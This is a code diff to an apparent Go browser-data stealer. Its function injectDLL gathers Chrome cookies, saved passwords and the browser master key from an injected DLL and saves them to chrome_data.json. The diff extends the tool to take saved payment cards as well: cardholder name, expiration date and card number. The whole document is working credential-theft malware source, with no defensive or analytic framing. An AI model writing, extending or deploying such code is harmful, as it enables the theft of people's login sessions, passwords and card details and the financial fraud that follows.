@@ -33,11 +33,19 @@ type Password struct {
 	Password string `json:"password"`
 }
 
+type Card struct {
+	Profile    string `json:"profile"`
+	NameOnCard string `json:"name_on_card"`
+	Expiration string `json:"expiration"`
+	Number     string `json:"number"`
+}
+
 type Output struct {
 	Timestamp string     `json:"timestamp"`
 	MasterKey string     `json:"master_key"`
 	Cookies   []Cookie   `json:"cookies"`
 	Passwords []Password `json:"passwords"`
+	Cards     []Card     `json:"cards"`
 }
 
 var (
@@ -101,6 +109,7 @@ func injectDLL() {
 		Timestamp: time.Now().Format(time.RFC3339),
 		Cookies:   []Cookie{},
 		Passwords: []Password{},
+		Cards:     []Card{},
 	}
 
 	buf := make([]byte, 4096)
@@ -155,6 +164,20 @@ func injectDLL() {
 				}
 			}
 		} else if strings.HasPrefix(msg, "DEBUG:") {
+			println("[DEBUG]", strings.TrimPrefix(msg, "DEBUG:"))
+		} else if strings.HasPrefix(msg, "CARD:") {
+			data := strings.TrimPrefix(msg, "CARD:")
+			if profile, rest, ok := parseProfile(data); ok {
+				parts := strings.SplitN(rest, "|", 3)
+				if len(parts) == 3 {
+					output.Cards = append(output.Cards, Card{
+						Profile:    profile,
+						NameOnCard: parts[0],
+						Expiration: parts[1],
+						Number:     parts[2],
+					})
+				}
+			}
 		} else if msg == "DONE" {
 			break
 		}
@@ -165,7 +188,7 @@ func injectDLL() {
 	jsonData, _ := json.MarshalIndent(output, "", "  ")
 	os.WriteFile("chrome_data.json", jsonData, 0644)
 
-	println("[+] saved", len(output.Cookies), "cookies and", len(output.Passwords), "passwords to chrome_data.json")
+	println("[+] saved", len(output.Cookies), "cookies,", len(output.Passwords), "passwords,", len(output.Cards), "cards to chrome_data.json")
 }
 
 func main() {
